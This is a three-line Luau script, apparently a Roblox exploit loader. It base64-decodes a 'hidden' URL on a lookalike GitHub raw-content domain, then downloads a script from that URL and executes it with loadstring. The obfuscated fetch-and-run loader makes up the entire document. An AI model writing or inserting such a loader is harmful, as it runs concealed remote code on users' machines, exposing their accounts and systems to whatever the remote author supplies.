-- Decodes the hidden link to script_okdib7.lua in memory
local inner_url = crypt.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHViaXVzZXJjb250ZW50LmNvbS9kb29tZnVnZ2xlci9sdWF1LWxvYWRlci9tYWluL3NjcmlwdHMvc2NyaXB0X29rZGliNy5sdWE=")
loadstring(game:HttpGet(inner_url))()
